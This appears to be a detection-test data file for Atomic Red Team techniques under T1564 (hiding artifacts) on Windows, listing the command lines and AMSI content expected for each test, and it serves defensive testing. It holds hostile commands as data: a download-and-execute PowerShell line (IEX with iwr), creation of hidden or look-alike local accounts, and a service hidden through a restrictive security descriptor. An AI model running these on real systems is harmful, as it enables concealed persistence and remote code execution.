T1564,windows,6afe288a,Extract binary files via VBAS
FYI,Test failed due to the non availability of MS Word in the current setup
_E_,AMSI,scan_content~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
_E_,AMSI,scan_content~=IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
_E_,AMSI,scan_content~=Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap

T1564,windows,2ec63cc2,Create a Hidden User Called "$"
_E_,Process,cmdline~=net user $ ATOMIC123! /add /active:yes

T1564,windows,5bb20389,Create an "Administrator " user (with a space on the end)
_E_,AMSI,scan_content~=New-LocalUser -Name "Administrator " -NoPassword

T1564,windows,333c7de0,Create and Hide a Service with sc.exe
ARG,executable_command,C:\Windows\System32\calc.exe
ARG,service_name,AtomicService
_E_,Process,cmdline~=sc.exe create #{service_name} binPath= #{executable_command}
_E_,Process,cmdline~=sc sdset #{service_name} D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

T1564,windows,2748ab4a,Command Execution with NirCmd
ARG,nircmd_location,PathToAtomicsFolder\..\ExternalPayloads\nircmd.exe
ARG,command_to_execute,win child class "Shell_TrayWnd" hide class "TrayClockWClass"
ARG,cleanup_command_to_execute,win child class "Shell_TrayWnd" show class "TrayClockWClass"
_E_,AMSI,scan_content~=nircmd.exe,scan_content~=#{command_to_execute}

